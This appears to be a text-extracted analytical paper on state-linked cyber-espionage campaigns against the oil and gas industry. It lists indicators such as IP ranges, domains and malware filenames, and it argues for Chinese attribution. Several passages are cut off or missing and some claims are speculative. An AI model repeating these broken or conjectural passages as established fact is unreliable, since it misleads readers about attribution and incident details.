One of the most easily distinguishable patterns on the above timeline is the growing frequency of reported cyber espionage.This saga of long-term campaigns has been garnering a lot of attention, and with good reason.Some have asserted that certain campaigns have existed since the early 2000’s<fn>1</fn>, yet their existence has only recently come to light in the private sector.The damage caused by these types of breaches is difficult to estimate because it occurred over such a long time span, but in some cases terabytes of data were stolen over the period of a few months.<fn>2</fn> When taken in relation to the oil industry, where proprietary information like bid exploration data is the lifeblood of the organization, this can be a disastrous blow.However, while campaigns like “Night Dragon” are pointedly targeted at the oil industry, others are far more encompassing in their breadth and appear more disparate.Establishing a baseline or pattern within this industry alone excludes a large and potentially useful amount of context.Not only were most of these cyber espionage campaigns larger in scope than simply the oil and gas industry, but some also completely excluded it.Interestingly, there are other cyber espionage campaigns not listed in the timeline (such as the infamous Flame and Mahdi viruses) that target countries with some of the largest oil reserves in the world, but the attacks themselves were not targeted at the Oil & Gas Industries.Given the sheer number of incidents, it would seem likely that there is more than one source, yet the technical data available seems to suggest otherwise.It is clear that these incidents represent a huge danger to the profitability and competitiveness, even the future success, of victim companies; Yet these consequences carry with them some level of inherent attribution.The very nature of proprietary information means that if an entity who had acquired it were to use the information, it could identify them as having a connection to the incident, whether directly or through a third party.Also, attacks of this scale require some level of organization that manifests itself in the form of repeated patterns of be- havior and resource usage that can suggest a common origin.This organization coupled with the resources and expertise necessary to process and analyze the exorbitant volume of stolen information leads to a high likelihood of state actor or organized criminal involvement.One of the largest difficulties present in identifying the provenance and totality of these attacks is that there is no publicly available aggregation of the body of information collected on the various APT activities.Instead, Antivirus & Incident Response firms which have the best vantage point on the situation are providing separate reports in which they use their own colloquial names and terms for the attacks, the tools, and the campaigns.This creates overlap, where campaigns with different names may in fact be part of the same campaign, and the technical data that is otherwise separated across the reports could together represent a more apparent pattern.Only one report, the Mandiant APT1 report, included a brief table noting that they had compared some of the other attacks and ruled out APT1 as the culprit.Additionally, these firms are entrusted with the safeguard of their customers’ information, and so often will not release the full extent of what was found, nor a definitive list of victims – adding to the obscurity.These sources also introduce their own biases which must be accounted for.For this reason, what follows is an overview of the various reports that mention the oil and gas industry as targets, and an analysis of important technical aspects and goals of these campaigns.Through this analysis, hopefully a more complete view of the action may be obtained to see if the goals, resources, techniques, and timeframes exhibit commonality between attacks.</section>


<footnote>
1 Mandiant, APT1 (Feb 13, 2013).Retrieved from http://www.mandiant.com/apt1
2 Ibid.</footnote>
 
<section>
<heading>Oil/Gas Inclusive or Specific Campaigns</heading>

‘Countries affect’ lists only countries where oil and gas companies were compromised.<heading>Campaign: NightDragon</heading>

<noncontent> 
Publisher: McAfee
Published: Feb 10,2011
Earliest Date: “[Attacks have been ongoing for] at least two years, and likely as many as four” Circa 2007-2009
</noncontent>
 
Synopsis: The NightDragon report released by McAfee was somewhat of a seminal event in that it was the first well known release of a fairly detailed APT analysis and technical attribution.Access sensitive documents
 4.Upload RAT malware to exfiltrate sensitive data
 5.Move laterally

McAfee was also able to identify much of the generic malware used, and communications techniques.They also suggested that the attackers worked between 9:00am and 5:00pm Beijing time during weekdays, and that most traffic was originating from the Shandong Province
of China.Symantec also asserts that these are the same hackers who operated in the “Aurora” campaign against Google in 2009.This campaign is unique to some degree in that it used a high number of zero day exploits in Adobe Flash and Microsoft’s Internet Explorer.While it appears that the attackers used spear-phishing (via email), their primary technique was the use of a “watering-hole” attack whereby they attack websites known to be frequented by the target using techniques such as SQL injection, and upload malicious files to these website.The target then visits the site and gets infected.This is interesting because the target does not have any indication that it has been compromised, but the number of overall infections goes up because of untargeted victims which also visit the site.This attack requires the attackers to find security vulnerability in the desired website after selection, requiring more technical skill than some of the other campaigns initially exhibit.The report itself is very sparse on any technical details or evidence, largely lacking substance.It provides a list of victims by industry and their country of origin.It also provides a detailed timeline for the attacks.Interestingly, Eugene Kaspersky heavily criticized the report for being alarmist and skewed, stating that many of the conclusions were presumptive.Some points of note are the use of HTRAN (a relay that Dell’s Cyber Threat Unit asserts was developed by the Honker Union of China, or HUC) for relaying, and registry of a few domains to an email address (dnsjack@yahoo.com) and IP ranges in China.Purpose: Theft of “intellectual property and company secrets”
Entry Method: Social Engineering, Spear Phishing, SQL-injection of web servers
Countries with Companies Affected:  Philippines, Canada
</section>


<section> 
<noncontent>
Publisher: Kaspersky
Published: Jan 14,2013
Earliest Date: May 2007
</noncontent>
<heading>Campaign: Red October </heading>
Synopsis: Red October is a sophisticated espionage network very much unlike other attacks which had been reported.While for the most part, the targets were diplomatic, there were several instances where Kaspersky noted that oil and gas industries had been targeted.The attack used domains registered to Russian email addresses, and IP ranges identified were serviced by largely German and Russian ISPs, however Kaspersky believes that the three “mothership” C2 servers identified are actually themselves proxies for an as yet unidentified C2 server which could then be operating nearly anywhere.A salient point is that Red October made use of exploit code that was “created by other attackers and employed during different cyberattacks.The attackers left the imported exploit code untouched, perhaps to harden the identification process.” Additionally, Red October is somewhat unique amongst attacks that targeted oil and gas in that it is capable of stealing information from a variety of embedded devices such as phone and routers.Purpose: “gather intelligence from the compromised organizations”
Entry Method: Social Engineering, Spear Phishing, SQL-injection of web servers
Countries with Companies Affected: Azerbaijan, Belarus, Turkmenistan, UAE
</section>

<section>
<noncontent>
Publisher: Mandiant
Published: Feb 19, 2013
Earliest Date: 2004-2006
</noncontent>
<heading>Campaign: APT1</heading>
Synopsis: The APT1 Report is perhaps the most detailed report to date.They also minced no words, directly accusing China as a state actor of engaging in Cyber Espionage.Researchers at Mandiant tracked back activities of an APT group they referred to as APT1 to the Chinese PLA Unit 61398 with relatively solid evidence.They even went so far as to report the building which they believed APT1 was operating out of, and unmask three operators – UglyGorilla, DOTA, and SuperHard – giving possible real names, online personas and other identifying information about them.APT1 operated over half a decade at least, stealing “hundreds of terabytes of data from at least 141 organizations,” often conducting such operations in parallel.The attackers maintain access to a given network for nearly a year on average.The attackers operated during the 9:00am to 5:00pm Beijing Time and thy followed a fairly strict methodology of attack, similar to the one noted in the NightDragon report:

 1.Initial reconnaissance

 2.Initial compromise of a system, largely though spear phishing

 3.Establishing a foothold in the network through Trojan dropping to a C2 server

 4.Escalating privileges through credential harvesting

 5.Internal reconnaissance of the network and

While Mandiant generically refers to energy companies, one of the trojaned files they note was used in the spearfishing attack bears the name “Oil-Field-Services-Analysis-And-Outlook.zip” which really ties.Mandiant notes that APT1 is also referred to as the Comment Group, a name given for the communications method used by their RATs which would set attributes in web pages as a means of C2.Bloomberg claims that US Intelligence had been keeping tabs on the group for years, which they referred to as Byzantine Candor.In the same breath, Bloomberg notes that the group is often referred to as the “Comment Group.” Bloomberg journalist Chloe Whiteaker also published a short but technical article that detailed some of the Comment Groups activities and tools.The report included an infographic that identified oil and gas victims of the comment group.As was already addressed, these attacks have been selected for one common thread they share – targets within the oil and gas industry.Other between them will now be scrutinized to find any additional links.This is not intended to suggest that the same group is behind every attack, but rather identify tactical and operational similarities that would point to a unified source of training or control.One of the most obvious similarities between all of the attacks is the motive: the large scale theft of corporate data.The methodology of data extraction is very similar between Night Dragon, Shady RAT, Elderwood, APT1, and Byzantine Candor.One note on this is that although the attacks all followed a similar methodology, this very methodology is common in the network penetration t world, and so not entirely unique.Slides from a presentation given by SANS affiliate James Shewmaker in 2008 highlight this methodology in brief: Reconnaissance, Port/Vulnerability Scan, Exploitation, and Repeat from the new vantage point.The only thing largely different is that the data exfiltration occurs after exploitation – that and the attackers were working from the outside initially, so they used social engineering to get in.With that said the fact that the majority of these used highly targeted spear phishing and exfiltrated similar data using RATs is not to be discounted.Additionally, these attacks all appear to be operating out of either Beijing, Shanghai, and Shandong province.The data below will show that Byzantine Candor and APT1 are one in the same – they share operators (Ugly Gorilla) and unique technical infrastructure like Fully Qualified Domain Names (FQDNs).Mandiant tied APT1 back to the PLA, and a .Mandiant even acknowledges the article written by Bloomberg in their report, and identifies the “Comment Group” as an alias
</section>

<section>
<heading>IP Addresses & Origins</heading>
 While about half of the reports omitted IP ranges, the majority of IP address ranges mentioned came from service provided by China Unicom to one of two locales: Beijing or Shanghai.The major exception to this is Red October, which largely had IP address ranges coming from Germany and Russia.Excluding Red October, in cases where ranges did not come from Beijing or Shanghai, they were often identified as host that were compromised and used as proxies loaded with tools such as HTRAN.<table>
 Night Dragon Elderwood Mirage Red October APT1
 [unspecified IP 114.240.0.0/20 141.101.239.225 223.166.0.0/15
 range – most 178.63.208.49 58.246.0.0/15
 C2 servers
 operating out 112.64.0.0/15
 of Heze City, 139.226.0.0/15
 China] 114.80.0.0/20
 101.80.0.0/20
</table>

Interestingly Night Dragon, which does not provide a range of IP addresses, offered instead that an individual operating out of Heze City, Shandong, China was responsible for providing the C2 servers through his company.An article published in the Wall Street Journal notes that McAfee identified this individual as “Song Zhiyue.”<fn>3</fn>
</section>

<section>
<heading>Domains</heading>
 A full list of domains retrieved from the various reports can be found in the appendices.Of the domains which appeared in the reports, only matches between APT1 and Byzantine Candor were identified.The rest were inconclusive as some of the reports did not include FQDNs and others which did include them did not provide a full list.Additionally, a large portion of the attacks made use of Dynamic DNS services, where the parent domain is not inherently malicious.But subdomains may be used by service subscribers for their own purposes without policing.<table>
 Registered domains common be-
 tween APT1 & Byzantine Candor
 *.hugesoft.org
 www.arrowservice.net
 www.blackcake.net
 www.dnsweb.org
 www.globalowa.com
 www.purpledailt.com
 www.worthhummer.net
 www1.earthsolution.org

<footnote>
3	 Hodge, N. & Entous, A.(Feb 10, 2011).Oil Firms Hit by Hackers From China, Report Says.Retrieved
From http://online.wsj.com/article/SB10001424052748703716904576134661111518864.html
</footnote>
</table>


With that said, there is another somewhat tenuous connection between two of the campaigns: Mirage and Elderwood.Night Dragon is not the only instance where an individual in China is charged with providing infrastructure to the attackers via their business – HB Gary authored a report in the wake of Operation Aurora which implicated a business called Bentium operating 3322.org out of Changzhou and a man named Peng Yong as providing dynamic DNS services to the attackers.<fn>4</fn> Operation Aurora was tied to Elderwood in Symantec’s Elderwood Project report and elsewhere.Dell Secureworks which authored the Mirage Report also authored a piece known as the Sin Digoo Affair.<fn>5</fn> The connecting factor between the Sin Digoo affair and Mirage was that an operator reused several email addresses (jeno_1980@hotmail.com & king_public@hotmail.com) and infrastructure between them.The C2 servers used a Dynamic DNS service operated by 3322.org.The Sin Digoo Affair also ties these back to Gh0stNet via 3322.org and the RSA breach based on the reuse of IP address blocks belonging to the “China Beijing Province Network (AS4808).” Peng Yong also owns other domains tied back to malicious use both in Aurora and elsewhere.According to Steve Ragan of the Tech Herald, Peng Yong is possibly the author of the CRC function used in some of the Aurora malware.<fn>6</fn>

 It is entirely possible that 3322.org was providing services to multiple separate APT groups, it is after all a fairly successfully Dynamic DNS service which has been documented in other malware cases.However, Peng’s level of involvement in the Aurora campaign should be scrutinized.Interestingly the Sin Digoo report also attempts to identify the jeno_1980 account which had the alias “Tawnya Grilith” attached to it.In the process of their investigation, they tied back the account to an operator going by the screen name “xxgchappy.” They also found a piece of malware ostensibly written by xxgc happy appearing to date back to March of 2002.This is potentially significant because it is the time frame around which the leaked US embassy cable had noted possible PLA cyber espionage activity.Malware used by this actor, as well as appearing in Mirage and Gh0stNet, was discovered in 2011 and 2012 to have infected government ministries in Vietnam, Brunei, and Myanmar.Additionally there are a few infected victims in Europe and the Middle East belonging to “government ministries in different countries, an embassy, a nuclear safety agency, and other business-related groups.”<fn>7</fn> This is of interest in part because Red October also targeted government ministries and embassies.However, in order to more fully analyze any connections between the domains that were listed in each of the reports, the whois and ARIN records could be examined.The contact information could then be cross-referenced to find similarities.Unfortunately, many of the domains had their contact information scrubbed or have since changed hands in the wake of the reports being released, so an analysis at this point would be erroneous and incomplete at best.A final note on domains is that many of the reports did look for registrant information – in the case of APT1 for instance, many registrants blatantly put China as their place of origin, or poorly masked this fact by misspelling the places they chose or including a Shanghai phone number.In the case of Red October however, all registrations with the exception of one were done with “.ru” email addresses, and addresses were not reused as had been the case in other instances.This signals a much more concerted effort to remain anonymous, and a level of professionalism not seen in the other attacks.</section>


<footnote>
4	 HB Gary.(Feb 10, 2010).Operation Aurora.Retrieved From http://hbgary.com/hbgary-threat-report-
operation-aurora
5	 Stewart, J.(Feb 29, 2012).The Sin Digoo Affair.Retrieved from http://www.secureworks.com/cyber-
threat-intelligence/threats/sindigoo/
6	 Ragan, S. (Jan 27, 2010).Was Operation Aurora really just a conventional attack?Retrieved from http://
www.thetechherald.com/articles/Was-Operation-Aurora-really-just-a-conventional-attack/9124/
7	 Stewart, J.(Feb 29, 2012).The Sin Digoo Affair.Retrieved from http://www.secureworks.com/cyber-
threat-intelligence/threats/sindigoo/
</footnote>
 <footer>15</footer>

<section>
<heading>Revised Attack Timeline</heading>
Considering the information which was discussed and presented, below is a revised attack timeline, consolidating individual campaigns into the likely perpetrator of the attack and extending as necessary.<figure>
 ShadyRAT
 The Elderwood Project

 Night Dragon
 Red October
 The Beijing Group [Mirage]

 PLA Unit 61398 [APT1, Byzantine Candor]




 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013
</figure>
</section>

<section>
<heading>Events that Correlate</heading>
Using the technical data and behavioral analysis above, individual incidents of reported hacking in news media can be connected to campaigns.Below are several incidents that demonstrate strong correlation to the information discussed above.</section>

<section>
 <heading>Norway, November 2011</heading>

 Norway had the most prolific series of cyber-attacks in the country’s history in November 2011.<fn>8</fn> As reported by Norway’s National Security Agency (NSM), more than 10 firms were targeted by an advanced persistent threat using spear-fishing attacks, many of which were in the oil industry.<fn>9</fn> The attacks may have been ongoing for over a year.The companies were unaware of the attacks until concerned employees reported receiving suspicious emails.No specific information was released on the tools or malware that were used to conduct these attacks; however NSM noted that a virus was used in conjunction with tailored spear-fishing attacks making use of trojan attachments.<fn>10</fn> It appeared that the purpose of the attacks was large-scale data exfiltration.As was the case in Night Dragon, the NSM bulletin suggests that the attacks varied slightly each time so as to avoid AV detection.An article by Defense News quotes NSM as stating that “the attacks have, on several occasions, come when the companies have been involved in large-scale contract negotiations.”<fn>11</fn> This could suggest that the attackers were privy to the negotiations.Interestingly, in 2010 Norway’s Statoil was engaged in negotiations with China Oilfield Services, Ltd. (COSL).According to the Wall Street Journal, COSL is the “oil-field services and rig-construction unit of state-controlled China National Offshore Oil Corp., the country’s largest offshore oil and gas company by output.”<fn>12</fn>

<footnote>
8	 BBC News.(2011, November 18).Hackers attack norway’s oil, gas, and defence businesses.BBC News
Technology.Retrieved from http://www.bbc.co.uk/news/technology-15790082
9	 France-Presse, A.(2011, November 18).Norwegian defense firms hacked, intel reports.Defense News.Retrieved from http://www.defensenews.com/article/20111118/DEFSECT04/111180309/Norwegian-Defense-
Firms-Hacked-Intel-Reports
10	 NSM (2011) Samme aktør bak flere datainnbrudd .Retrieved From https://www.nsm.stat.no/Aktuelt/
Nytt-fra-NSM/Samme-aktor-bak-flere-datainnbrudd/
11	 France-Presse, A.(2011, November 18).Norwegian defense firms hacked, intel reports.Defense News.Retrieved from http://www.defensenews.com/article/20111118/DEFSECT04/111180309/Norwegian-Defense-
Firms-Hacked-Intel-Reports
</footnote>


The goal of the attacks appeared to be the collection of confidential information, such as user names, passwords, industrial drawings, and other proprietary documents.<fn>13</fn> This would seem to be consistent with the types of information sought in both Night Dragon and APT1.The timeframe of the attack aligns with the event timeline listed in the APT1 report, and within the report there is an event appearing in Norway.This is then a convergence of time and objectives across these operations which complement the tactical similarities involving the use of social engineering, persistent backdoors, and large scale data exfiltration.</section>

<section>
<heading>Telvent, September 2012</heading>

 In September 2012 Canadian energy company Telvent was infiltrated.Telvent is responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America.<fn>14</fn> The attackers installed malware which they used to steal project files related to Telvent’s OASyS SCADA product.According to security blogger Brian Krebbs, OASyS is “a product that helps energy firms mesh older IT assets with more advanced ‘smart grid’ technologies.” <fn>15</fn>

The infiltration follows the same methodical approach exhibited in the Night Dragon and Norwegian intrusions.Not only was the malware difficult to detect, but it was planted using spear-phishing methods that targeted mid to high level executives<fn>16</fn> <fn>17</fn>.Perhaps the most convincing piece of evidence as to the origins of the attack is what appears to be a notification released by Telvent which identified malicious files and domains used for Command and Control (C2).The filenames “fxsst.dll” and “ntshrui.dll” which appear in the Telvent notification also appear in the APT1 report, along with the domains “hugesoft.org” and “bigish.net” which are noted as mainstays of APT1 by Mandiant.Several security firms at the time also reported the belief that the attack had been perpetrated by the “comment group” an alias in the Mandiant Report for APT1.In fact, Mandiant actually mentioned the Telvent attack in their report under a section entitled “APT1 in the News.”

The reason the Telvent attack is so important is that it represents the possibility for departure from simply data exfiltration.Although available information indicates that the goal of the attack was stealing software, the software could just have easily been modified and replaced.Attacking a prolific energy ICS company like Telvent means that a trojan could be planted in the software, being unintentionally distributed to Telvent’s customers and offering the perpetrator an avenue for more insidious attacks.</section>


<footnote>
12	 Simon Hall (2013, December 13).China, Norway Strike Oil Deal Despite Tensions.Wall Street Journal.Retrieved from http://online.wsj.com/article/SB10001424052748703727804576016841533225226.html
13	 Ibid.14	 Vijayan, J.(2012, September 26).Energy giant confirms breach of customer project files.Computer-
world.Retrieved from http://www.computerworld.com/s/article/9231748/Energy_giant_confirms_breach_of_
customer_project_files
15	 Krebs, B.(2012, September 26).Chinese hackers blamed for intrusion at energy industry giant telvent.Retrieved from http://krebsonsecurity.com/2012/09/chinese-hackers-blamed-for-intrusion-at-energy-industry-
giant-telvent/#more-16936
16	 Vijayan, J.(2012, September 21).Cyber espionage campaign targets enery companies.Computerworld.Retrieved from http://www.computerworld.com/s/article/9231596/Cyber_espionage_campaign_targets_energy_
companies
17	 Ibid.</footnote>

<section> 
<heading>Attribution</heading>

<heading>China</heading>
 Perhaps the most readily apparent attribution is to China as a state actor – the APT1 report makes a convincing argument for this which offers a lot of very well constructed circumstantial evidence.Night Dragon highlights the use of a RAT known as zwSheel which was used both as a to perform C2 and to create custom trojans.Interestingly, upon launch zwShell displays an error dialog with a hidden text field and the program will not function unless the password ‘zw.china’ is entered into this hidden text field.The ranges of consecutive IP addresses used were large enough that it is likely that the Chinese government had to be involved in some capacity.China certainly possesses the motive to commit the attacks – according to the Washington Times, China is already surpassing the United States as the number one oil importer from the Middle East<fn>18</fn>, and poised to become the number one oil importer globally.</section>

<section>
 <heading>Increasing Demand</heading>

 Chinese demand for oil has grown dramatically as its economy continues to expand.Since the mid-1990s, China has been a net importer of oil.<fn>19</fn> The continuous growth of the Chinese economy has resulted in vast increases in the need for fuel and petro products.China has doubled its oil consumption in the last 10 years and become the second largest consumer of oil in the world behind the U.S.<fn>20</fn> Like the U.S., China is now dependent on its oil imports to feed its thriving economy.It is estimated that China’s import dependency could rise to over 50% by 2020.<fn>1</fn>

 China’s oil refineries are not capable of handling the current demand the economy is placing on them.There is evidence that the refineries used for fuel are at a competitive disadvantage when compared to other countries.To complicate matters, many Chinese oil refineries are also oriented to the making of diesel and not gasoline, which is in increasing demand<fn>1</fn>.This means China is in great need of more sources of oil and more efficient refineries.The development of improved refining and mining equipment takes years and can cost millions of dollars.Exploration costs for finding new oil reserves have almost tripled in the past decade.<fn>21</fn> They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process.It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own.This establishes that there are significant reasons for China to act on behalf of its own oil industry and use its state resources to conduct cyber-attacks against corporate entities worldwide.</section>

<footnote>
18	 Hill, P. (March 14, 2013).China poised to top U.S. as oil buyer; increased car sales spur jump.Retrieved
from http://www.washingtontimes.com/news/2013/mar/14/china-poised-to-top-us-as-top-oil-buyer/?page=all
19	 Skeer, J.(2007).China on the move: Oil price explosion?.Energy policy, 35(1), 678-691.
http://discover.lib.purdue.edu:3210/purdue?ctx_ver=Z39.88-2004&ctx_enc=info%3Aofi%2Fenc%3AUTF-8&ctx_tim=2013-03-
09T15%3A59%3A35IST&url_ver=Z39.88-2004&url_ctx_fmt=infofi%2Ffmt%3Akev%3Amtx%3Actx&rfr_id=info%3Asid%2Fprimo.exlibrisgroup.com%3Aprimo3-Article-wos&rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3A&rft.genre=article&rft.atitle=China%20on%20the%20
20	 Index Mundi, (2012).Country comparison > Oil – consumption > Top 10.Retrieved from http://www.indexmundi.com/g/r.aspx?v=91&t=10
21	 Johnson, C., (2010).Oil exploration costs rocket as risks rise.Retrieved from http://www.reuters.com/
article/2010/02/11/us-oil-exploration-risk-analysis-idUSTRE61A28X20100211
</footnote>

<section>
<heading>China’s Oil Production	</heading>

<heading>China’s Oil Production in Thousands of Barrels per Day<fn>22</fn></heading>

 As seen in the chart above, China experienced a significant increase in oil production during 2009.This spike in production could be due to information that China gained from US firms through cyber espionage actions, such as Night Dragon.The Night Dragon attacks were believed to have begun circa 2007.According to Kirk, information taken during these attacks includes market intelligence reports and information on operational production systems.<fn>23</fn> Similarly, the Mandiant report shows that the APT1 group has monitored Mandiant’s energy industry customers from approximately the beginning of 2009 to 2012.<fn>24</fn> During these attacks, APT1 would export terabytes of data from the victims to China.In tandem with these revelations, China’s also aggressively pursued oil supply contracts during 2009.<fn>25</fn> During this time major Chinese state oil companies acquired holdings in 18 different countries.China is determined to take on oil and gas infrastructure development and to acquire oil industry assets.<fn>26</fn>

 Although there is evidence that China has been conducting cyber espionage activities against oil industry targets as far back as 2007, there is only trivial growth until 2009.This could be a result of the time and recourse commitment required to process the data that was acquired.As mentioned, both the Night Dragon and APT1 attacks stole an enormous amount of data from English speaking companies.It is necessary for English-fluent operators to sift through this data and extract actionable information to report.This information would also need to be provided to experts in the field who could recognize the its vale, and that process would have to be done discreetly so as not to arouse suspicions.This would take time.The Mandiant report comments on the fact that there are limited English-fluent operators directly involved in the technical end of APT1, which would significantly hinder progress.<fn>27</fn> Considering these factors and the timeframe for growth presented above, it is conceivable that the information and strategy for its use would not be available until 2009.At this point, China could act to increase the output of the holdings that they currently owned.Also, the information gained from market intelligence reports and possibly exploration reports could guide the state companies in deciding which new holdings to purchase during this time period.The new holdings would allow for increased output overall.</section>

<section>
 <heading>China’s Investments</heading>


 China’s fervor for oil acquisition has not been limited to aggressive increases in holdings and contracts.These activities are likely only one piece of a global strategy to secure China’s future oil requirements, including reserves that may not be productive today or in the immediate future.This overarching strategy has apparently led to a pattern of quiet investment, which may be a direct cause for concern in America.An article appearing in the Associated Press discusses these Chinese investments in Venezuela, the country with the largest proven oil reserves as of 2011, and throughout the Caribbean and South America.The article notes that “when Venezuela seized billions of dollars in assets from Exxon Mobil and other foreign companies, Chinese state banks and investors didn’t blink.Over the past five years they have loaned Venezuela more than $35 billion.” They have similarly provided aid to countries like Ecuador, another country within the top 20 of proven oil reserves.In some cases it appears that the Chinese are making loans that the countries will likely be incapable of repaying, placing them squarely within China’s control.Many of the deals included “repayment in oil and natural gas” and billions of dollars have been loaned directly to energy companies in Russia and Turkmenistan, both of which have been targeted in cyber espionage campaigns and are in the top 5 for proven natural gas reserves.<footnote>
22	 U.S. Energy Information Administration.(2013, February 12).International Energy Statistics [Data
file].Retrieved from http://www.eia.gov/cfapps/ipdbproject/iedindex3.cfm?tid=5&pid=53&aid=1&cid=CH,&syi
d=2006&eyid=2012&unit=TBPD
23	 Kirk, J.(2011, February 10).‘Night dragon’ attacks from china strike energy companies.Retrieved from
http://www.networkworld.com/news/2011/021011-night-dragon-attacks-from-china.html
24	 Mandiant.(2013, February 18).APT1: Exposing one of China’s cyber espionage units.Retrieved from
http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf
25	 Hayward, D.L.L.(2009, June 18).China’s oil supply dependence.Journal of Energy Security.Retrieved
from: http://www.ensec.org/index.php?option=com_content&view=article&id=197:chinas-oil-supply-dependen
ce&catid=96:content&Itemid=345
26	 Ibid.27	 Mandiant.(2013, February 18).APT1: Exposing one of China’s cyber espionage units.Retrieved from
http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf
</footnote>
 <footer>19</footer>


 Although the IEA has predicted that America is moving towards energy independence and is poised to become the number one oil exporter by 2017, the loans are breeding closeness with and reliance on China by countries in close proximity to the US.This could allow for the Chinese to weaken American influence in the region and create agitation against the US or between other countries within the region in order to distract the US from its goals in other areas strategic to the Chinese.These deals also place China in the supply chain for borrowers’ projects where China has insisted on Chinese companies being involved as a stipulation of the loan.These loans have not required any economic reforms to accompany them, meaning that countries which could not secure a loan from the IMF due to poor financial decisions may continue to flounder in spite of aid, perhaps even more so because of it.In the worst case scenario, these countries become unstable.While this may cause issues to the Chinese in some logistical capacities, it would also serve to divert some of America’s attention, making the situation a palatable outcome for China.</section>

<section>
<heading>Other actors</heading>
 An analysis of these events would be remiss without exploring any other possible attribution.Though unlikely, it is possible that there were other actors involved.As pointed out by Eugene Kaspersky in his criticism of the Shady RAT report, some of the tools and techniques are generic enough to not lend themselves to attribution to a particular entity.Even the ones that are of Chinese origin do not of themselves implicate the Chinese government, only an actor familiar with how the tool works or minimally trained in Mandarin.A large portion of these tools were freely available on underground Chinese hacking sites.Chinese hacking collectives or corporations may have been independently involved.However, due to the suspicions voiced in the leaked diplomatic cables suggesting PLA involvement<fn>28</fn> and Mandiant’s research on the topic indicating the same<fn>29</fn>, it is highly unlikely that the Chinese government was not involved whatsoever.These sources, and the timeframe in which the attacks occurred -- between roughly 9am and 5pm consistently over a protracted period of time<fn>30</fn><fn>31</fn> -- is indicative of a formalization of the activity.This is further evidenced by the resources required to carry out the attack and the Chinese government’s grasps on censorship of their citizens through technical controls.Terabytes of data infiltrating the country is unlikely to have been missed, particularly over the course of a decade of activity.If China had been involved in any capacity in cyber espionage attacks and this had been discovered by another entity, said entity might have leveraged this knowledge to collude with them either through coercion, cooperation, or clandestinely without the Chinese government knowing.Though this may seem farfetched, a report released by a Luxemburg security firm details how, in the wake of Mandiant’s APT1 report, they decided to engage in an intelligence gathering operation on the APT groups operating out of China.By scanning Chinese IP ranges for C2 servers known to be used in the APT1 attacks and exploiting weaknesses in the attackers’ C2 infrastructure, they were able to access, monitor, and control the APT infrastructure without the adversary’s knowledge.Bloomberg also hinted at the possibility of American security firms acting in a similar way when they “exploit[ed] a hole in the hackers’ security … logging the intruders’ every move as they crept into networks...” Knowing that the Chinese were actively engaged in such operations and likely turning a blind eye to any infiltration of data, another actor operating through China and attempting to incriminate China could have engaged in cyber espionage as well.This is truly a stretch of the imagination, and there is no evidence whatsoever to support this theory.The most likely case for any attribution involves the Chinese government in some capacity.</section>

<footnote>
28	 Glanz, J.& Markoff, J.(Dec 4 2010).Vast Hacking by a China Fearful of the Web.Retrieved from http://
www.nytimes.com/2010/12/05/world/asia/05wikileaks-china.html?pagewanted=all&_r=0
29	 Mandiant.(Feb, 2013).APT1: Exposing One of China’s Cyber Espionage Units.Retrieved from http://
www.mandiant.com/APT1
30	 Ibid.31	 McAfee® Foundstone® Professional Services and McAfee Labs™.(Feb 10, 2011).Global Energy Cyberat-
tacks: “Night Dragon”.Retrieved from http://www.mcafee.com/us/resources/white-papers/wp-global-energy-
cyberattacks-night-dragon.pdf
</footnote>

<section>
<heading>Significance Going Forward</heading>

 The most important takeaway from these incidents is the significance they hold to the future of the Oil & Gas industry.Inexorably, Oil and Gas is intertwined with the Cyber domain, and will only continue to become more so as the time progresses.The increased reliance on technology means that more and more data and control will be accessible to the attackers in the future.A large contingent of the attacks relied on social engineering and spear phishing as a point of entry, though there is a shift toward “watering hole” attacks.This is significant because even as technical controls get better, unwitting employees and their behavior will continue to be a focal point in targeted attacks.Automation via SCADA/ICS has been an integral part of the Oil industry’s past and will be even more so in the future.Attacks like the Telvent attack herald an insidious turn of events for SCADA within Oil & Gas.The attackers seemed intent on stealing SCADA software, but it is conceivable that they could have taken such an opportunity to embed their own code within it, providing a capability to manipulate large swaths of North American pipeline at will.This is not meant to be alarmist, but rather considers the next evolution of attack.Leveraging malicious SCADA software to achieve a kinetic outcome is not the baseline going forward, but it is well within the realm of possibility.The nature of a capability like this means that it can only be leveraged to catastrophic effect once, so the possibility of an entity using it outside of sustained or ardent conflict is low.However using this on a micro-scale, and degrading service or quality of service through manipulation of malicious software on the PLCs or HMIs could be more viable in a peacetime setting, and less noticeable.This type of activity could be used at the height of negotiations or disputes to put an adversary in a compromising position, or simply distract them.The Cyber-warfare doctrine of large nation-states like China and Russia that have a huge stake in the Oil & Gas Industries is one of perpetual conflict.Timothy Thomas discusses this in his books Recasting the Red Star and The Dragon’s Quantum Leap.The idea of an “active defense” and keeping potential competitors “off balance” is the posture going forward.The concept of peace being a time without conflict is rapidly disappearing.As globalization has become the status quo and global economies become ever more entangled, threat of a large-scale kinetic confrontation between top tier economic powerhouses is nearly strategically unviable.Instead, both state and non-state actors will use constant conflict in the Cyber realm as a method for accruing resources and exercising control.While cyber conflict often brings to mind the idea of SCADA initiated pipeline explosions, the theft of intellectual property and business communications is far more likely to continue.This type of low intensity conflict is cost-effective and politically sustainable in an environment where direct attribution is at times difficult.The idea of a constant or long term “ally” or “strategic partner” is no longer valid – coordination will be largely issue specific, and only to the extent required to achieve an end.While coordinating on one topic nations will be in conflict on another.This is not in any way a revolutionary or new idea; however it is becoming more and more relevant to salient industries operating within their own nation state and abroad as they become far more accessible and targetable in this type of conflict.Non-state actors will play a huge role in future cyber conflict within the oil and gas industry.The Norway attack which coincided with a meeting by a state-backed Oil & Gas company may suggest that they already are playing a role.Certainly Antivirus & Incident Response companies are playing a role as non-state actors by releasing these reports.But aside from cooperation with Sate actors, non-state actors may operate independently against other non-state actors in pursuit of competitive advantage or sabotage.Hacker collectives like anonymous could have an out-sized impact if more highly organized, and the attacks they have already carried out could become more severe – instead of simply releasing email addresses, they could release bid data, or attempt something more destructive akin to a Shamoon type attack.The release of reports on APT is in a way its own form of cyber conflict; the rhetoric of these reports is an information influence operation, both targeted at potential customers and at adversaries.These reports also allow adversaries to see how they were detected and correct mistakes going forward.It is likely that future attacks will lack the types of unprofessional mistakes made during these 